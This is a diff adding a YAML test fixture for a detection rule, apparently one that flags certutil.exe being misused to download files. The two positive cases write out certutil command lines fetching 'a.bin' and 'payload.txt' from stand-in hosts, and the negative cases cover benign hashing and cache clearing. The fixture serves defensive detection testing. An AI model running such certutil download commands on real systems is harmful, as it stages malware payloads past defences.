@@ -1,0 +1,22 @@
+positive:
+  - name: urlcache split fetch over http
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      OriginalFileName: 'CertUtil.exe'
+      CommandLine: 'certutil.exe -urlcache -split -f http://203.0.113.10/a.bin C:\Users\Public\a.bin'
+  - name: verifyctl fetch over https
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      OriginalFileName: 'CertUtil.exe'
+      CommandLine: 'certutil.exe -verifyctl -f -split https://example.invalid/payload.txt'
+negative:
+  - name: hashing a local file
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      OriginalFileName: 'CertUtil.exe'
+      CommandLine: 'certutil.exe -hashfile C:\iso\image.iso SHA256'
+  - name: clearing the url cache (no URL)
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      OriginalFileName: 'CertUtil.exe'
+      CommandLine: 'certutil.exe -urlcache * delete'
